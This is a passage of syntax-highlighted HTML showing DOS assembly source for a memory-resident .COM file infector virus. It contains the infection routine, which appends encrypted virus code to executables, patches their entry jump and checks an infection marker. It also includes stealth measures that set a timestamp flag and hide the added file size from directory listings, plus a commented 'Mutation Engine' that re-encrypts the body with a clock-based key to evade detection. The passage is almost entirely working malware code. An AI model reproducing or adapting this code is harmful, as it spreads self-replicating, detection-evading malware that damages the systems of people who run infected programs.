</span><span class="sc5">repurn</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; from file size.</span><span class="sc0">
</span><span class="sc5">fcb1</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">popf</span><span class="sc0">                            </span><span class="sc1">; Same again but for the FCB</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">meat_hook</span><span class="sc0">   
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">xx2</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">xx2</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01ah</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01ah</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">meat_hook</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],</span><span class="sc5">len</span><span class="sc0"> 
</span><span class="sc5">meat_hook</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ret</span><span class="sc0">  

</span><span class="sc5">com_txt</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc5">reset</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">; File Attrib routines</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">  
</span><span class="sc5">set_back</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">find_att</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">                      </span><span class="sc1">; Alter file attributes</span><span class="sc0">
</span><span class="sc5">i21</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">exitsub</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">ret</span><span class="sc0">   

</span><span class="sc5">checkit</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">; Infect routine</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; Save some more registers</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">; Check to see if file is a </span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; .COM file if not then</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                         </span><span class="sc1">; quit..</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">                     </span><span class="sc1">; Find '.' in File Name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_txt</span><span class="sc0">           </span><span class="sc1">; Compare with COM extension</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; Restore Reg...</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exitsub</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">foundtype</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                      </span><span class="sc1">; Check for commaND.com</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'DN'</span><span class="sc0">                </span><span class="sc1">; Quit if found..</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exitsub</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">nameptr</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; Save DS:DX pointer for later</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">nameptr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                      </span><span class="sc1">; Find Attributes of file to infect</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">find_att</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exitsub</span><span class="sc0">                      </span><span class="sc1">; Error Quit.</span><span class="sc0">

</span><span class="sc5">alteratr</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">attrib</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; Save them</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">reset</span><span class="sc0">                      </span><span class="sc1">; Reset them to normal</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                    </span><span class="sc1">; Open file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">i21</span><span class="sc0">        
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exitsub</span><span class="sc0">                      </span><span class="sc1">; Error Quit</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; Set DS to CS</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">handle</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Store handle</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                    </span><span class="sc1">; Read file time and date</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">handle</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">i21</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ke9</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">date</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">                </span><span class="sc1">; Save DX</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                       </span><span class="sc1">; Set Stealth Stamp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">time</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">                </span><span class="sc1">; Save CX</span><span class="sc0">
                                                  
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; Read in first 5 bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                      </span><span class="sc1">; To save them</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldstart</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">i21</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">closeit</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close2</span><span class="sc0">                       </span><span class="sc1">; Error Quit</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                    </span><span class="sc1">; Move filepointer to end</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">                   </span><span class="sc1">; -5 bytes offset from end</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0fffbh</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">i21</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                        </span><span class="sc1">; Error Quit</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">si_val</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Save File saize for later</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ea60h</span><span class="sc0">                   </span><span class="sc1">; See if too big</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                       </span><span class="sc1">; Yes then Quit</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; Read in last 5 bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                      </span><span class="sc1">; </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tempmem</span><span class="sc0">           </span><span class="sc1">; </span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">i21</span><span class="sc0">                        </span><span class="sc1">; </span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                        </span><span class="sc1">; Error </span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; Reset ES to CS</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tempmem</span><span class="sc0">           </span><span class="sc1">; Check if Already infected</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                        </span><span class="sc1">; Yes the Close and Quit</span><span class="sc0">
                                                 
</span><span class="sc5">zapfile</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">; No Infect and Be Damned</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">si_val</span><span class="sc0">       </span><span class="sc1">; </span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; </span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">jpover</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Setup new jump</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mut_eng</span><span class="sc0">                    </span><span class="sc1">; Call Mutation Engine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; Save prog to end of file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">handle</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Load Handle</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">length</span><span class="sc0">                   </span><span class="sc1">; LENGTH OF PROGRAM****</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">i21</span><span class="sc0">                        </span><span class="sc1">; Write away</span><span class="sc0">
</span><span class="sc5">close2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                        </span><span class="sc1">; Quit if error</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; Reset DS to CS</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;      </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                    </span><span class="sc1">; Move File pointer to start</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; of file</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">                             </span><span class="sc1">; Clever way to XOR DX,DX</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">i21</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                        </span><span class="sc1">; Error Quit..</span><span class="sc0">
                                                 
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; Save new start </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                      </span><span class="sc1">; </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jpover</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">i21</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                    </span><span class="sc1">; Restore Time and Date</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">handle</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">time</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">date</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">i21</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                      </span><span class="sc1">; Close file </span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">i21</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">exit_sub</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">nameptr</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Reset Attributes to as they where</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">attrib</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">nameptr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_back</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; Return to INT 21h Handler</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               CyberTech Mutation Engine </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               This is Version Two of the Mutation Engine </span><span class="sc0">
</span><span class="sc1">;               Unlike others it is very much Virus Specific..  Works</span><span class="sc0">
</span><span class="sc1">;               Best on Resident Viruses..</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               To Call</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               si_val = File Size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               Returns</span><span class="sc0">
</span><span class="sc1">;               DS:DX = Encrypted Virus Code, Use DS:DX pointer to</span><span class="sc0">
</span><span class="sc1">;                       Write From..</span><span class="sc0">


</span><span class="sc5">mut_eng</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">                      </span><span class="sc1">; Get Time</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">i21</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">switch</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Use Sec./100th counter as key</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">switch2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">  </span><span class="sc1">; Save to Decrypt and Encrypt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">si_val</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Get file size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">main2</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">main</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; Store to Decrypt offset</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">loop_1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">28h</span><span class="sc0">     </span><span class="sc1">; Toggle Add/Sub</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">switch2</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">        </span><span class="sc1">;       "</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; Reset Segment Regs.</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; Find Spare Segment</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0bch</span><span class="sc0">                     </span><span class="sc1">; and put in es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">              </span><span class="sc1">; Move Decrypt function</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">decryptlen</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">main2</span><span class="sc0">             </span><span class="sc1">; Start the code encrypt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virlen</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">loop_10</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">lodsw</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">switch2</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_10</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc0">            </span><span class="sc1">; move ID string to end</span><span class="sc0">
